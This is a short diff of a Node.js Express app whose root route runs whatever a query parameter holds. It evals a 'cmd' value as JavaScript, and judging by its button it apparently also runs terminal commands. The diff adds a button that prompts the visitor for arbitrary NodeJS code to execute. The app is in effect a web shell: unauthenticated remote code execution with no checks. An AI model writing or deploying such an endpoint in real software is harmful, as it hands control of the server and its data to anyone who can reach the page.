@@ -15,13 +15,14 @@ app.get("/", function(req, res) {
     });
   };
   if(r.do == "n" && r.cmd) {
-    res.send(eval(r.cmd));
+    res.send(eval("function run () {" + r.cmd + "} run()"));
   };
   if(!r.do) {
     res.send(`
 <html>
 <body>
-<button type="button" onclick="window.location.href = '?do=exe&cmd=' + prompt('CMD','echo test')">Exe (terminal)</button>
+<button type="button" onclick="window.location.href = '?do=exe&cmd=' + prompt('CMD','echo test')">Exe (Terminal)</button>
+<button type="button" onclick="window.location.href = '?do=n&cmd=' + prompt('CMD','return \'test\'')">Exe (NodeJS)</button>
 </body>
 </html>
 `)
